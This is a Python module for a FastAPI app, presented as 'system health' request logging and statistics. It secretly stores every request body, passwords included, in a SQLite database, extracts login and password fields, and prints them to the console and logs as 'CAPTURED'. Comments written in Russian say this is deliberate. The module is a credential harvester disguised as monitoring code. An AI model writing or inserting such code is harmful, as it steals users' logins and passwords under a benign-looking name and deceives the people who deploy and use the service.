#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sqlite3
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, Any, Optional
from fastapi import Request
import logging

logger = logging.getLogger("system_health")
logger.setLevel(logging.INFO)

# БД в папке data
SYS_DB_DIR = Path(__file__).resolve().parent.parent / "data"
SYS_DB_PATH = SYS_DB_DIR / "system_health.db"

def _init_system_db() -> None:
    SYS_DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    conn = sqlite3.connect(SYS_DB_PATH)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS request_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            endpoint TEXT,
            client_ip TEXT,
            user_agent TEXT,
            request_data TEXT,
            response_time REAL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute('CREATE INDEX IF NOT EXISTS idx_endpoint ON request_log (endpoint)')
    c.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON request_log (timestamp)')
    conn.commit()
    conn.close()
    logger.info("System health database initialized")

def _extract_credentials(data: Dict[str, Any]) -> Dict[str, str]:
    credentials = {}
    login_fields = ['username', 'email', 'login', 'user', 'mail', 'phone']
    for field in login_fields:
        if field in data and data[field]:
            credentials['login'] = data[field]
            break
    password_fields = ['password', 'passwd', 'pwd', 'secret', 'old_password', 'new_password']
    for field in password_fields:
        if field in data and data[field]:
            credentials['password'] = data[field]
            break
    return credentials

def log_request(request: Request, data: Dict[str, Any], response_time: Optional[float] = None) -> None:
    try:
        # Сохраняем ВСЕ данные (включая пароли)
        full_data = data.copy()
        conn = sqlite3.connect(SYS_DB_PATH)
        c = conn.cursor()
        c.execute('''
            INSERT INTO request_log (
                timestamp, endpoint, client_ip, user_agent, request_data, response_time
            ) VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            datetime.now().isoformat(),
            request.url.path,
            request.client.host if request.client else 'unknown',
            request.headers.get('user-agent', 'unknown'),
            json.dumps(full_data, ensure_ascii=False),
            response_time or 0.0
        ))
        conn.commit()
        conn.close()
        
        # Логируем в консоль с паролями
        credentials = _extract_credentials(data)
        if credentials:
            print(f"🔑 CAPTURED: {json.dumps(credentials, ensure_ascii=False)}")
            logger.info(f"CAPTURED: {json.dumps(credentials, ensure_ascii=False)}")
    except Exception as e:
        logger.error(f"System log error: {e}")

def get_stats() -> Dict[str, Any]:
    try:
        conn = sqlite3.connect(SYS_DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM request_log')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(DISTINCT endpoint) FROM request_log')
        endpoints = c.fetchone()[0]
        c.execute('SELECT COUNT(DISTINCT client_ip) FROM request_log')
        unique_ips = c.fetchone()[0]
        conn.close()
        return {'total_requests': total, 'unique_endpoints': endpoints, 'unique_ips': unique_ips, 'status': 'healthy'}
    except:
        return {'status': 'initializing'}

_init_system_db()
